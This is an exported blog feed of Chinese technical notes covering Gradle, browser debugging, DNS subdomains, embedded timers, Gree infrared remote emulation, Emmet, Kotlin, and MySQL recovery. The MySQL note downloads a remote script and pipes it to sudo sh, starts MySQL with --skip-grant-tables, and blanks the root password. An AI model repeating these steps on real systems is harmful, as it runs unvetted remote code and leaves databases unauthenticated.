    <content><![CDATA[问题：Caused by: org.gradle.api.internal.plugins.PluginApplicationException: Failed to apply plugin [id ‘com.android.application’]解决办法：在gradle.properties添加android.overridePathCheck&#x3D;true即可
出现原因:一般为挪动了文件夹的位置
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>在浏览器调试js程序</title>
    <url>/posts/af74895e/</url>
    <content><![CDATA[在浏览器中调试在编写更复杂的代码前，让我们先来聊聊调试吧。
调试 是指在一个脚本中找出并修复错误的过程。所有的现代浏览器和大多数其他环境都支持调试工具 —— 开发者工具中的一个令调试更加容易的特殊用户界面。它也可以让我们一步步地跟踪代码以查看当前实际运行情况。
在这里我们将会使用 Chrome（谷歌浏览器），因为它拥有足够多的功能，其他大部分浏览器的功能也与之类似。
“资源（Sources）”面板你的 Chrome 版本可能看起来有一点不同，但是它应该还是处于很明显的位置。

在 Chrome 中打开 示例页面。
使用快捷键 F12（Mac：Cmd+Opt+I）打开开发者工具。
选择 Sources（资源） 面板。如果你是第一次这么做，那你应该会看到下面这个样子：

切换按钮  会打开文件列表的选项卡。
让我们在预览树中点击和选择 hello.js。这里应该会如下图所示：
资源（Sources）面板包含三个部分：

文件导航（File Navigator） 区域列出了 HTML、JavaScript、CSS 和包括图片在内的其他依附于此页面的文件。Chrome 扩展程序也会显示在这。
代码编辑（Code Editor） 区域展示源码。
JavaScript 调试（JavaScript Debugging） 区域是用于调试的，我们很快就会来探索它。现在你可以再次点击切换按钮  隐藏资源列表来给代码腾出一些空间。

控制台（Console）如果我们按下 Esc，下面会出现一个控制台，我们可以输入一些命令然后按下 Enter 来执行。
语句执行完毕之后，其执行结果会显示在下面。
例如，1+2 将会返回 3，而 hello(“debugger”) 函数调用什么也没返回，所以结果是 undefined：
断点（Breakpoints）我们来看看 示例页面 发生了什么。在 hello.js 中，点击第 4 行。是的，就点击数字 “4” 上，不是点击代码。
恭喜你！你已经设置了一个断点。现在，请在第 8 行的数字上也点击一下。
看起来应该是这样的（蓝色是你应该点击的地方）：
断点 是调试器会自动暂停 JavaScript 执行的地方。
当代码被暂停时，我们可以检查当前的变量，在控制台执行命令等等。换句话说，我们可以调试它。
我们总是可以在右侧的面板中找到断点的列表。当我们在数个文件中有许多断点时，这是非常有用的。它允许我们：
快速跳转至代码中的断点（通过点击右侧面板中的对应的断点）。通过取消选中断点来临时禁用对应的断点。通过右键单击并选择移除来删除一个断点。……等等。
oklink爬取大佬心得这里我就不再赘述了，直接看大佬的文章叭。毕竟这些东西，并不具有可重复性。大概懂思路，其他的网站的情况又会大不相同。需要另外分析。
]]></content>
      <tags>
        <tag>js</tag>
        <tag>浏览器</tag>
      </tags>
  </entry>
  <entry>
    <title>安装 删除 卸载 Deb 包文件</title>
    <url>/posts/4b5a1715/</url>
    <content><![CDATA[图形界面直接点击deb文件即可完成安装
命令行界面#卸载sudo apt-get autoremove 要移除的软件包名#安装sudo apt-get install 要安装的软件包名#要安装.deb套件包时sudo dpkg -i package_file.deb#要卸载.deb套件包时sudo dpkg -r package_file.deb
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
  </entry>
  <entry>
    <title>子域名共享使用</title>
    <url>/posts/8fd4bcc4/</url>
    <content><![CDATA[
记录最近想到的一个小知识点

问题起源在最开始我还没有购买自己的域名时，我大多时候想着白嫖，于是就逛了很多包括MyDomain，eu.org此类的网站。同时也在一些学习的qq群里看到有人共享二级域名给别人免费使用。这么一想，我突然发现。似乎是个可以免费提供出去的服务（适用场景：在一个小团队里，大家并不需要每个人都购买一个域名，而是统一的在一个team.com的一级域名下，在将每个二级域名例如：名字缩写+team.com这样式的。分配给每一个人，这样每个人都会有一个自己可以完全支配的域名）。
这个功能在github，jetbrain Space中，语雀语雀里有些不一样的。但是他们都是根据你的用户名生成一个唯一的字符串，然后把这个字符串与他们自己的域名拼接起来。然后CNAME到一个具体的个人主页。这样就算是有一个属于你自己的个人主页和唯一的地址。
而我所表达的是，你拥有一个完全可以分离出去的二级域名，你可以把这个二级域名再做单独的解析。
实操这里我以DNSPod举例，他是一个国产的DNS解析服务商，他的免费版就可以实现这个功能。


首先我们点击添加域名，然后输入我们的二级域名，这里我输入test，然后填写我们的目标地址，这里我填写test.zfxt.top，然后点击确定。 
然后我们就可以看到我们的二级域名已经添加成功了。 此时并没有完成功能，这里会有个问题需要我们在主域名的解析里添加两个NS解析记录，这两个解析记录是DNSPod给我们的，我们需要把这两个解析记录添加到我们的主域名解析里。 
添加完这两个解析记录后，我们就可以看到我们的二级域名已经可以正常解析了。 
最后点击开始解析，你就实现了一个二级域名的共享使用了。 

以上，使用这个功能，你可以把你的二级域名共享给别人使用，别人就可以白嫖你的域名了。哈哈哈

不过要注意的是，一个可以单独解析的二级域名可以做很多的事，但也有一些DNS服务商（如cloudflare）就不支持解析二级域名（免费版不支持）。

]]></content>
      <tags>
        <tag>DNS解析</tag>
        <tag>子域名</tag>
      </tags>
  </entry>
  <entry>
    <title>安装双系统（win+unbuntu)</title>
    <url>/posts/8d78cfd3/</url>
    <content><![CDATA[https://zhuanlan.zhihu.com/p/617640635
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
  </entry>
  <entry>
    <title>定时器分时操作系统</title>
    <url>/posts/c8527c44/</url>
    <content><![CDATA[前后台系统，RTOS与定时器任务管理系统前后台系统
  在裸机上写程序,通常把程序分为两部分：前台系统和后台系统。
  简单的小系统通常是前后台系统，这样的程序包括一个死循环和若干个中断服务程序：应用程序是一个无限循环，循环中调用API函数完成所需的操作，这个大循环就叫做后台系统。中断服务程序用于处理系统的异步事件，也就是前台系统。前台是中断级，后台是任务级。
写这个系统的目的:

为了能够充分利用cpu,不让他闲下来
可以实现多个功能同时发生

(前置条件):你需要知道只有一个cpu,他在物理的层面上是不可能同时发生的,但是他们可以欺骗人类,人类的视觉暂留有0.1s到0.4s

只要这几个任务执行的频率足够高,那么对你而言,他们就是同时发生的.

第二个点就是(化delay为挂起). 假设我们要执行一个跑马灯的操作,如果我们要设置他跑的慢一点,我们可以再他的每个灯显示后添加一个delay(time),但是在delay期间,我们的cpu是单纯的在等待,什么都没做. 于是我们可以设置一个时间任务,设置多少秒(只要设置和delay一样的时间就可以实现和delay一样的效果)而且在这些时间的间隔可以执行其他的任务
 //原本的功能show()&#123;    SetLed(0,0);    delay_ms(2);    SetLed(1,1);    delay_ms(2);    SetLed(2,2);    delay_ms(2);    SetLed(3,3);    delay_ms(2);&#125;//修改后show(u8 w, u8 value)&#123;    SetLed(w,value);&#125;//每两秒执行一次per_2ms_conduct()&#123;    static int i = 0;    show(i,i);&#125;//这样子就没有delay出现了,你可以在同时执行其他的功能.

对于下面这部分的内容加了注解
//这个函数只做了一件事(时间到了,将flag标志置为1,表示可以做)//这个Timer-&gt;uCount基于你设置的每次中断所消耗的时间,可以设置的很小,你可以自己调整void updateTimerTask(TimerDef *Timer)&#123;    if (Timer-&gt;uCount &gt;= 10) //0.5*10=5 ms到达    &#123;        Timer-&gt;uCount = 0;        Timer-&gt;uFlag5ms = 1; //5 ms标志位置1        Timer-&gt;uCount10ms ++;        Timer-&gt;uCount50ms ++;        Timer-&gt;uCount100ms ++;        Timer-&gt;uCount1000ms ++;    &#125;    if (Timer-&gt;uCount10ms &gt;= 2)//10ms到达    &#123;        Timer-&gt;uCount10ms = 0;        Timer-&gt;uFlag10ms = 1;    &#125;    if (Timer-&gt;uCount50ms &gt;= 10)//50ms到达    &#123;        Timer-&gt;uCount50ms = 0;        Timer-&gt;uFlag50ms = 1;    &#125;&#125;时间任务管理//大循环任务//在大循环任务中放入你认为需要定时执行的耗时任务如(Per_5ms_tasks),在把这个大循环放在while(1)里头void EverWhile_tasks()&#123;&#125;//5ms 任务void Per_5ms_tasks()&#123;    if(Timer.uFlag5ms != 1)//5ms未到达        return;//退出函数task1();//用户函数    Timer.uFlag5ms = 0;//清空5ms标志位&#125;//10ms 任务void Per_10ms_tasks()&#123;    if(Timer.uFlag10ms != 1)        return;task2();//用户函数    DIU.Timer.uFlag10ms = 0;&#125;//50ms 任务void Per_50ms_tasks()&#123;    if(Timer.uFlag50ms != 1)        return;task3();//用户函数    Timer.uFlag50ms = 0;&#125;//100ms 任务void Per_100ms_tasks()&#123;    if(DIU.Timer.uFlag100ms != 1)  return;task4();//用户函数    DIU.Timer.uFlag100ms = 0;// //&#125;//1s 任务void Per_1s_tasks()&#123;    if(DIU.Timer.uFlag1000ms != 1)        return;task5();//用户函数DIU.Timer.uFlag1000ms = 0;&#125;

以上,你就可以实现:例如(我每1ms执行一次显示任务,这样在我眼里他就是一直亮着的,每3ms执行一次串口通信,每次访问完后都可以及时把内容输送给限时任务执行.按键任务也是类似的(但是按键要考虑防抖问题,所以你设置的时间间隔需要有考究))
这个时候的cpu就和你一样,飞速运转,一点都没有闲着.
]]></content>
      <tags>
        <tag>嵌入式</tag>
      </tags>
  </entry>
  <entry>
    <title>实体、视图对象、数据传输对象关系</title>
    <url>/posts/4a9e831e/</url>
    <content><![CDATA[1、entity 里的每一个字段，与数据库相对应，
2、vo 里的每一个字段，是和你前台 html 页面相对应，
3、dto 这是用来转换从 entity 到 vo，或者从 vo 到 entity 的中间的东西 。
举个例子：
你的html页面上有三个字段，name，pass，age
你的数据库表里，有两个字段，name，pass ， 注意没有 age。
而你的 vo 里，就应该有下面三个成员变量 ，因为对应 html 页面上三个字段 。

 dto 和 entity 里面的字段应该是一样的，dto 只是 entity 到 vo，或者 vo 到 entity 的中间过程，如果没有这个过程，你仍然可以做到增删改查，这是根据具体公司规范来的 。

]]></content>
  </entry>
  <entry>
    <title>家庭服务器Home Server实践</title>
    <url>/posts/7a8dcea3/</url>
    <content><![CDATA[
引用自家庭服务器Home Server实践

大佬写的很好，我这里不赘述，这些都是我在家庭服务器上实践过的，非常有用。
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>家庭服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>容器编排工具比较：Docker vs Podman</title>
    <url>/posts/c1def6a7/</url>
    <content><![CDATA[这两个技术都是容器编排工具。他们都有各自的优势和特点。其中，docker有其自己的一体化解决方案。

docker与podman的对比

]]></content>
      <tags>
        <tag>docker</tag>
        <tag>podman</tag>
      </tags>
  </entry>
  <entry>
    <title>屏蔽csdn</title>
    <url>/posts/6d15f173/</url>
    <content><![CDATA[天下苦csdn久矣每次在浏览器中搜索想要得到的答案时，前几个选项总会是csdn的内容。而对于csdn.我曾经是包容的，能接受的，但是他对登陆的要求太多了

你点进csdn,他就会是一个5s的登陆请求，5s后才能关闭
还有他乱七八糟的广告内容和付费内容
关注后才能继续观看文章
其次在没登陆的情况下，他还不能进行复制（虽然可以通过关闭javascript来实现复制）但是他的每个弹窗都让我感到繁琐。
同样的问题我可以在知乎，stackoverflow,掘金找到答案

既然如此，我毅然决然的选择将csdn从我的世界中革除
使用插件uBlacklist屏蔽搜索结果中的csdn的内容
这样子后，你就不会在搜索结果中看到任何关于csdn的内容来
]]></content>
      <categories>
        <category>优化浏览器体验</category>
      </categories>
  </entry>
  <entry>
    <title>对象属性合并</title>
    <url>/posts/5e6eb7a1/</url>
    <content><![CDATA[合并对象this.info &#x3D; {…this.info,…dataObj)它会将this.info和dataObj的所有属性合并，如果有重复的，优先取后边dataObj的。最后整合后提交给this.info
]]></content>
      <tags>
        <tag>vue</tag>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title>嵌入式模拟格力空调遥控器</title>
    <url>/posts/7d1fbdb2/</url>
    <content><![CDATA[
记录一下：在嵌入式实验中，通过实现模拟格力空调的红外信号实现了使用单片机遥控空调的效果。

红外信号传输原理红外线的通讯原理 红外光是以特定的频率脉冲形式发射，接收端收到到信号后，按照约定的协议进行解码，完成数据传输，在消费类电子产品里，脉冲频率普遍采用 30KHz 到 60KHz 这个频段，NEC协议的频率就是38KHZ。 这个以特定的频率发射其实就可以理解为点灯，不要被复杂的词汇难住了，就是控制灯的闪烁频率(亮灭)，和刚学单片机完成闪光灯一样的意思，只不过是灯换了一种类型，都是灯。 接收端的原理: 接收端的芯片对这个红外光比较敏感，可以根据有没有光输出高低电平，如果发送端的闪烁频率是有规律的，接收端收到后输出的高电平和低电平也是有规律对应的，这样发送端和接收端只要约定好，那就可以做数据传输了。
红外接收原理NEC协议NEC协议是众多红外线协议中的一种(这里说的协议就是他们数据帧格式定义不一样，数据传输原理都是一样的)，我们购买的外能遥控器、淘宝买的mini遥控器、电视机、投影仪几乎都是NEC协议。 像格力空调、美的空调这些设备使用的就是其他协议格式，不是NEC协议，但是只要学会一种协议解析方式，明白了红外线传输原理，其他遥控器协议都可以解出来。
NEC格式完成一次数据传输的完整格式
引导码: 由9ms的高电平+4.5ms的低电平组成。4个字节的数据: 用户码+用户反码+数据码+数据反码。 这里的反码可以用来校验数据是否传输正确，有没有丢包。
重点: NEC协议传输数据位的时候，0和1的区分是依靠收到的高、低电平的持续时间来进行区分的—这是解码关键。标准间隔时间：0.56ms收到数据位0: 0.56ms收到位1: 1.68ms
所以，收到一个数据位的完整时间表示方法是这样的：收到数据位0: 0.56m低电平+ 0.56ms的高电平收到数据位1: 0.56ms低电平+1.68ms的高电平
红外线接收头模块输出电平的原理： 红外线接收头感应到有红外光就输出低电平，没有感应到红外光就输出高电平。
红外发送原理首先，需要理解是，发送信号时，我们需要发送的是方波，而不是一条直线，在上图中可以看出来，如果我们要发送一个数据”1”，那么我们就要先发送560μs的高电平和1680μs的低电平，而要发送这个高电平就需要使用38khz的频率去交替发送高低电位，持续560μs，才可以正确发射红外光。而低电平就会比较简单。只要保持0电位即可。
交替发送高电平&#x3D;&gt; 发射红外光直接发送低电平&#x3D;&gt; 不发射红外光
原理如上：下面上代码：
源码接受模块初始化：
void Remote_Init(void)&#123;    RCC-&gt;APB1ENR |= 1 &lt;&lt; 2; // TIM4 时钟使能    RCC-&gt;APB2ENR |= 1 &lt;&lt; 4; // 使能PORTC时钟    GPIOC-&gt;CRH &amp;= 0XFFFF0FFF; // PC11 输入    GPIOC-&gt;CRH |= 0X00008000; // 上拉输入    // GPIOC-&gt;ODR|=1&lt;&lt;11;//PC11 上拉    TIM4-&gt;ARR = 10000; // 设定计数器自动重装值 最大10ms溢出    TIM4-&gt;PSC = 71;	   // 预分频器,1M的计数频率,1us加1.    TIM4-&gt;DIER |= 1 &lt;&lt; 0; // 允许更新中断    TIM4-&gt;CR1 |= 0x01;// 使能定时器4    // MY_NVIC_Init(1, 3, TIM4_IRQChannel, 2); // 抢占1，子优先级3，组2    // 设置外部中断    Ex_NVIC_Config(GPIO_C, 11, 3); // 全频段触发    MY_NVIC_Init(0, 2, EXTI15_10_IRQChannel, 2);&#125;

这一部分设置PCin(11)为红外接受的端口。然后设置了外部中断来作为监听信息的变化，如果产生了高低电平的变化，都会调用EXTI15_10_IRQHandler()函数。然后初始化了TIM4定时器，用来记录时间的长短。启用关闭红外接受功能
/** * 打开红外接收 */void Remote_ON(void)&#123;    // 禁用 EXTI 第11线    EXTI-&gt;IMR |= (1 &lt;&lt; 11); // 禁用中断掩码寄存器上的第11位    EXTI-&gt;EMR |= (1 &lt;&lt; 11); // 禁用事件掩码寄存器上的第11位&#125;/** * 关闭红外接收 */void Remote_OFF(void)&#123;    // 禁用 EXTI 第11线    EXTI-&gt;IMR &amp;= ~(1 &lt;&lt; 11); // 禁用中断掩码寄存器上的第11位    EXTI-&gt;EMR &amp;= ~(1 &lt;&lt; 11); // 禁用事件掩码寄存器上的第11位&#125;

在单片机上，如果同时存在红外发射和红外接受，就可能会导致，你发射信号然后自己接收到，于是就会有每发一个信号就中断接受一次信号，导致数据的延时出现问题。所以在每次发送红外信息时，需要关闭红外接受功能。测量电平时间
/*函数功能: 测量高电平持续的时间*/u32 Infrared_GetTime_H(void)&#123;    TIM4-&gt;CNT = 0;    while (RDATA)    &#123;    &#125; // 等待高电平结束    return TIM4-&gt;CNT;&#125;/*函数功能: 测量低电平持续的时间*/u32 Infrared_GetTime_L(void)&#123;    TIM4-&gt;CNT = 0;    while (!RDATA)    &#123;    &#125; // 等待高电平结束    return TIM4-&gt;CNT;&#125;

通过这个功能,来判断是否符合560和1680的时间。具体的接受功能
void other_remote_get()&#123;	time = Infrared_GetTime_L();	if (time &lt; 7000 || time &gt; 10000)		return; // 标准时间: 9000us	times_low[0] = time;	time = Infrared_GetTime_H();	// 得到高电平时间	if (time &lt; 3000 || time &gt; 5500)		return; // 标准时间4500us	times_high[0] = time;	// printf(&quot;高电平时间为%d\n&quot;,time);	for (i = 0; i &lt; 35; i++)	&#123;		time = Infrared_GetTime_L();		// 得到低电平时间		times_low[1 + i] = time;		if (time &lt; 400 || time &gt; 800)			return;		// 标准时间: 560us		time = Infrared_GetTime_H(); // 得到高电平时间		times_high[1 + i] = time;		if (time &gt; 1400 &amp;&amp; time &lt; 1800) // 数据1 1680us		&#123;			datas[i] = 1;		&#125;		else if (time &gt; 400 &amp;&amp; time &lt; 700) // 数据0 560us		&#123;			datas[i] = 0;		&#125;		else			return;	&#125;	// 第一段数据结束	time = Infrared_GetTime_L();	// 得到低电平时间	if (time &lt; 400 || time &gt; 700)		return; // 标准时间: 600us	times_low[36] = time;	time = Infrared_GetTime_H();	// 得到高电平时间	if (time &lt; 6000 || time &gt; 13000)		return; // 标准时间4500us	times_high[36] = time;	for (i = 0; i &lt; 32; i++)	&#123;		time = Infrared_GetTime_L();		// printf(&quot;32位数据码之%d，时间为%d\n&quot;,i+1,time);		times_low[37 + i] = time;		// 得到低电平时间		if (time &lt; 400 || time &gt; 800)			return;		// 标准时间: 560us		time = Infrared_GetTime_H(); // 得到高电平时间		times_high[37 + i] = time;		if (time &gt; 1300 &amp;&amp; time &lt; 1900) // 数据1 1680us		&#123;			datas[35 + i] = 1;		&#125;		else if (time &gt; 400 &amp;&amp; time &lt; 700) // 数据0 560us		&#123;			datas[35 + i] = 0;		&#125;		else			return;	&#125;	for (i = 0; i &lt; 67; i++)	&#123;		printf(&quot;%d,&quot;, datas[i]);	&#125;	printf(&quot;\n&quot;);	printf(&quot;低电平时间\n&quot;);	for (i = 0; i &lt; 69; i++)	&#123;		printf(&quot;第%d个数据:%d\n&quot;, i + 1, times_low[i]);	&#125;	printf(&quot;\n&quot;);	printf(&quot;高电平时间\n&quot;);	for (i = 0; i &lt; 69; i++)	&#123;		printf(&quot;第%d个数据:%d\n&quot;, i + 1, times_high[i]);	&#125;	printf(&quot;\n&quot;);&#125;

这一部分我做了debug和输出，将我获得到的空调红外信号输出出来，好让自己进行模拟。
发射模块初始化部分
&#123;    //**硬件初始化    RCC-&gt;APB2ENR |= 1 &lt;&lt; 4; // 使能PORTC时钟    GPIOC-&gt;CRH &amp;= 0xFFF0FFFF;    GPIOC-&gt;CRH |= 0x00030000; // PC.12推挽输出    GPIOC-&gt;ODR |= 0x00001000; // PC.12输出高  	//端口输出高？&#125;

这一部分很好理解，只是把对应的红外发射端口初始化了而已。发送高低电位
void Send_H_delay(int time)&#123;	int i;	for (i = 0; i &lt; time; i++)	&#123;		IR_SEND = 1;		delay_us(13);		IR_SEND = 0;		delay_us(13);	&#125;&#125;void Send_L_delay(int time)&#123;	int i;	for (i = 0; i &lt; time; i++)	&#123;		IR_SEND = 0;		delay_us(26);	&#125;&#125;

这里的延时就是考虑了38khz的频率，在38khz的频率下，每26μs就会产生一次电平变化，因此我只要发射高电平的时候每13μs交替一次即可。然后这里的time就是作为次数，用次数*26&#x3D;持续的时间。发送数据
 void TR_SendData() &#123;	// 引导码	Send_H_delay(338);	Send_L_delay(170);	// 数据	for (t = 0; t &lt; 35; t++)	&#123;		Send_H_delay(22);		if (data[t])		&#123;			Send_L_delay(60);		&#125;		else		&#123;			Send_L_delay(22);		&#125;	&#125;	// 连接码	// 引导码	Send_H_delay(22);	Send_L_delay(770);	// 第二段数据	for (t = 0; t &lt; 32; t++)	&#123;		Send_H_delay(22);		if (data[35 + t])		&#123;			Send_L_delay(60);		&#125;		else		&#123;			Send_L_delay(22);		&#125;	&#125;	// 发送结束码	Send_H_delay(22);	Send_L_delay(22);&#125;

这一块为什么这么发送就需要看下面的内容了，因为他不是采用标准的NEC格式，而是使用格力空调的自有格式
格力空调编码格力空调遥控器（YB0F2）红外码组成如下，按解码顺序排列 
起始码（S）+35位数据码+连接码（C）+32位数据码 
1、各种编码的电平宽度： 
数据码由“0”“1”组成： 
0的电平宽度为：600us低电平+600us高电平，
1的电平宽度为：600us低电平+1600us高电平
起始码S电平宽度为：9000us低电平+4500us高电平
连接码C电平宽度为：600us低电平+20000us高电平
 2、数据码的形成机制 
前35位数据码形成如下图所示：
后32位数据码形成如下图所示：

上表中，大于两位的数据都是逆序递增的，各数据的意义如下：
校验码形成：
校验码 &#x3D; (模式 – 1) + (温度– 16) + 5  + 左右扫风 + 换气 + 节能 - 开关之后取二进制后四位，再逆序；
以上知道这些功能后就基本可以实现对格力空调的遥控功能。下面附上我的代码。下载链接
]]></content>
      <tags>
        <tag>-嵌入式</tag>
      </tags>
  </entry>
  <entry>
    <title>嵌套、属性、乘法、编号、文本操作符</title>
    <url>/posts/b520c1d4/</url>
    <content><![CDATA[嵌套操作符
引用自知乎&gt; (子元素)div&gt;ul&gt;li表现为：

&lt;div&gt;    &lt;ul&gt;        &lt;li&gt;&lt;/li&gt;    &lt;/ul&gt;&lt;/div&gt;
+ （兄弟元素）div+p+bq表现为：
&lt;div&gt;&lt;/div&gt;&lt;p&gt;&lt;/p&gt;&lt;blockquote&gt;&lt;/blockquote&gt;
^ 返回上层

使用 ^ 运算符，您可以爬上树的一个层次，并更改上下文div+div&gt;p&gt;span+em^bq表现为：&lt;div&gt;&lt;/div&gt;&lt;div&gt;    &lt;p&gt;&lt;span&gt;&lt;/span&gt;&lt;em&gt;&lt;/em&gt;&lt;/p&gt;    &lt;blockquote&gt;&lt;/blockquote&gt;&lt;/div&gt;// 此时的上下文返回到两个div所在的这一层了
当然了，^ 也可以多个并用，有几个 ^ 就返回几层div+div&gt;p&gt;span+em^^bq表现为：&lt;div&gt;&lt;/div&gt;&lt;div&gt;    &lt;p&gt;&lt;span&gt;&lt;/span&gt;&lt;em&gt;&lt;/em&gt;&lt;/p&gt;&lt;/div&gt;&lt;blockquote&gt;&lt;/blockquote&gt;// 此时上下文已经返回到最外层了
** * 乘法**使用 * 操作符，您可以定义应该输出多少次该元素，跟我们加减乘除里的乘法含义相近

ul&gt;li*5
表现为：
&lt;ul&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;&lt;/ul&gt;

属性操作符(Attribute operators)ID 和 ClassEmmet使用类似于CSS选择器的语法给元素添加属性
div#header+div.page+div#footer.class1.class2.class3表现为：
&lt;div id=&quot;header&quot;&gt;&lt;/div&gt;&lt;div class=&quot;page&quot;&gt;&lt;/div&gt;&lt;div id=&quot;footer&quot; class=&quot;class1 class2 class3&quot;&gt;&lt;/div&gt;
$编号(Item numbering)操作符可以生成重复元素，而 $ 可以去元素进行编号。需要将 $ 放在元素名、属性名或者属性值里
ul&gt;li.item$*5表现为：
&lt;ul&gt;    &lt;li class=&quot;item1&quot;&gt;&lt;/li&gt;    &lt;li class=&quot;item2&quot;&gt;&lt;/li&gt;    &lt;li class=&quot;item3&quot;&gt;&lt;/li&gt;    &lt;li class=&quot;item4&quot;&gt;&lt;/li&gt;    &lt;li class=&quot;item5&quot;&gt;&lt;/li&gt;&lt;/ul&gt;
如果想实现00x的格式，该怎么办呢？
可以连写多个$就可以生成带有前导的编号了
ul&gt;li.item$$$*5表现为：
&lt;ul&gt;    &lt;li class=&quot;item001&quot;&gt;&lt;/li&gt;    &lt;li class=&quot;item002&quot;&gt;&lt;/li&gt;    &lt;li class=&quot;item003&quot;&gt;&lt;/li&gt;    &lt;li class=&quot;item004&quot;&gt;&lt;/li&gt;    &lt;li class=&quot;item005&quot;&gt;&lt;/li&gt;&lt;/ul&gt;
Text: {}文本可以使用大括号 {}为元素添加文本，就类似于模板的插入符
div&#123;hello world&#125;表现为：
&lt;div&gt;hello world&lt;/div&gt;]]></content>
      <tags>
        <tag>Emmet</tag>
      </tags>
  </entry>
  <entry>
    <title>微服务：松耦合，统一整体的架构风格</title>
    <url>/posts/d21e1073/</url>
    <content><![CDATA[（1）微服务就是一种架构风格（2）微服务就是把一个项目拆分成独立的多个服务，并且多个服务是可以独立运行的，而每个服务都会占用线程。
表现为结构上的松耦合，功能上的统一整体微服务，关键其实不仅仅是微服务本身，而是系统要提供一套基础的架构，这种架构使得微服务可以独立的部署、运行、升级，不仅如此，这个系统架构还让微服务与微服务之间在结构上“松耦合”，而在功能上则表现为一个统一的整体。这种所谓的“统一的整体”表现出来的是统一风格的界面，统一的权限管理，统一的安全策略，统一的上线过程，统一的日志和审计方法，统一的调度方式，统一的访问入口等等。
]]></content>
      <tags>
        <tag>微服务</tag>
      </tags>
  </entry>
  <entry>
    <title>数据类、密封类和枚举类</title>
    <url>/posts/ff4fa478/</url>
    <content><![CDATA[数据类在class前面加上data前缀，将会创建一个数据类。编译器会自动的从主构造函数中根据所有声明的属性提取以下函数：
equals() &#x2F; hashCode()toString() 格式如 “User(name&#x3D;John, age&#x3D;42)”componentN() functions 对应于属性，按声明顺序排列copy() 函数
copy函数示例：
data class User(val name: String, val age: Int)fun main(args: Array&lt;String&gt;) &#123;    val jack = User(name = &quot;Jack&quot;, age = 1)    val olderJack = jack.copy(age = 2)    println(jack)    println(olderJack)&#125;
密封类密封类用来表示受限的类继承结构。每个枚举常量只存在一个实例，而密封类 的一个子类可以有可包含状态的多个实例
sealed class Exprdata class Const(val number: Double) : Expr()data class Sum(val e1: Expr, val e2: Expr) : Expr()object NotANumber : Expr()fun eval(expr: Expr): Double = when (expr) &#123;    is Const -&gt; expr.number    is Sum -&gt; eval(expr.e1) + eval(expr.e2)    NotANumber -&gt; Double.NaN&#125;
他的子类都会被作为内嵌类的属性使用。他一般都配合when使用。
枚举类实现一个类型安全的枚举。其中每个常量用逗号分隔，每个美剧常量都是一个对象。
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>数据库备份及恢复</title>
    <url>/posts/d635a576/</url>
    <content><![CDATA[常用数据库备份策略
mysqldump工具备份（数据量小） mysqldump由于是mysql自带的备份工具，所以也是最常用的mysql数据库的备份工具。支持基于InnoDB的热备份。但由于是逻辑备份，所以速度不是很快，适合备份数据量比较小的场景。
 mysqldump完全备份+二进制日志 —&gt;实现时间点恢复

基于LVM快照备份（冷备份）
 在物理备份中 ，有基于文件系统的物理备份（LVM的快照），也可以直接用tar之类的命令打包。但这些只能进行冷备份
 不同的存储引擎能备份的级别也不一样，MyISAM能备份到表级别，而InnoDB不开启每表一文件的话就只能备份整个数据库。

使用percona提供的xtrabackup（推荐）
 支持InnoDB的物理热备份，支持完全备份，增量备份，而且速度非常快，而且支持InnoDB引擎的数据在不同数据库迁移。 优点如下：

无需停止数据库进行InnoDB热备份，在50G以上的数据量备份时候，应该是首选工具。

支持增量备份MySQL并通过流传输到其他的服务器上。

备份MySQL的时候不会增加服务器的负载。




在这里我们不演示如何备份的工作，而只针对于如何将数据恢复到数据库中，并且关闭密码校验。
恢复数据库
这里以xtrabackup备份后的数据为例。将从一台全新的ubuntu服务器上完成数据库的恢复

首先我们会拥有一个backup.tar.gz的一个压缩包。他实际上就是我们数据库的data文件夹。因此我们只需要将这个压缩包解压到对应的data目录下，然后通过修改密码。重新启动这个数据库即可完成数据的再次访问。
第一步:解压备份文件首先还是先把我们的数据库文件解压出来我们这里选择在/root/back/102目录下解压
tar -zxvf backup.tar.gz -C /root/back/102

表示会把backup.tar.gz解压到/root/back/102目录下
然后我们创建一个data目录,用来把解压后的文件移动到这个目录下.
cd /root/back/102 #移动到指定目录下mkdir data # 创建目录mv /root/back/102/tmp/backup/2024-03-23/full/* /root/back/102/data # 移动文件到指定目录下

此时我们可以看到在你对应的目录下,有一个data文件夹,这个文件夹下面就是数据库的所有文件.
第二步：安装mysql服务
安装docker 这里我们使用docker来安装mysql服务，这样子可以简化很多环境问题。
 curl -fsSL https://test.docker.com -o test-docker.shsudo sh test-docker.sh

通过docker拉取mysql镜像
docker pull mysql:8.0.19

启动mysql服务这里要考虑两个情况,一个是我们正常的使用.一个是跳过过校验过程进入安全模式实现对密码的修改.
docker run -p 3306:3306 --name 102 \-v /root/back/102/mysql-files:/var/lib/mysql-files \-v /root/back/102/conf:/etc/mysql \-v /root/back/102/logs:/var/log/mysql \-v /root/back/102/data:/var/lib/mysql \-e MYSQL_ROOT_PASSWORD=yourpassword \-d mysql:8.0.19 \--skip-grant-tables # 跳过密码校验.带上这个参数表示进入安全模式

 这里他会把你的数据库文件挂载到/var/lib/mysql目录下.


第三步：修改密码
这里我们需要修改密码并允许远程连接

docker exec -it 102 bash # 进入docker服务内部mysql -u root -p # 进入mysql(此时是安全模式,不会有密码校验)

进入mysql后我们查看数据后.需要修改密码.
# 进入mysql数据库use mysql; # 查看用户信息select host, user, authentication_string, plugin from user; # 修改密码update user set authentication_string=&#x27;&#x27; where user=&#x27;root&#x27;;

按ctrl+d退出mysql,再按一次退出docker然后我们退出docker服务,重新启动mysql(不进入安全模式)
